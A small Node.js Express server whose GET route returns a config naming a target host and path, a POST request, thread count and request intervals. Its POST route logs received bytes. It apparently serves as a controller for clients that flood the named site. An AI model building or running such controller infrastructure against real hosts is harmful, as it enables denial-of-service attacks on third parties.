const express = require('express');
const app = express();
const port = 3000;

app.get('/', (_, res) => {
  const newLine = '\r\n';
  const separator = newLine.repeat(2);
  const host = 'beatmasta.studio';
  const port = 80;
  const path = '/test.php';
  const method = 'POST';
  const contentLength = 1024;
  const threadCount = 2;
  const callIntervalInMs = 500;
  const configFetchIntervalInMs = 5000;
  const state = 'START';
  const headers = `${method} ${path} HTTP/1.1${newLine}Host: ${host}${newLine}Accept: */*${newLine}Content-length: ${contentLength}${separator}${host}:${port}${separator}${contentLength}${separator}${threadCount}${separator}${callIntervalInMs}${separator}${configFetchIntervalInMs}${separator}${state}`;

  res.set('Content-Type', 'text/plain');

  console.log('Sending config...');
  res.send(headers);
});

app.post('/', (req, res) => {
  console.log('Receiving data with len: ', req.socket.bytesRead);
  res.send('Hello World!');
});

app.use(function (err, _, res, __) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
